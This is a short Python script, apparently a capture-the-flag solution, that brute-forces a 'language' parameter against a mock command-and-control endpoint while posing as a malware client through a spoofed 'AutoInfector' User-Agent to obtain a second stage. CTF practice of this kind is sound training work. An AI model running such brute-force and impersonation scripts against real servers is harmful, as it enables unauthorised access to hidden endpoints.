#!/usr/bin/env python3
import requests


URL = "http://c2.capturetheflag.fr:4444/stage2"

for i in range(0x1000):
    data = {
        "language": hex(i)[2:].zfill(8)
    }
    resp = requests.post(
        URL,
        data=data,
        headers={"User-Agent": "AutoInfector V1.0"}
    )

    if resp.status_code == 403:
        print(".", end="", flush=True)
    else:
        print(data)
        print(resp.content)
        break
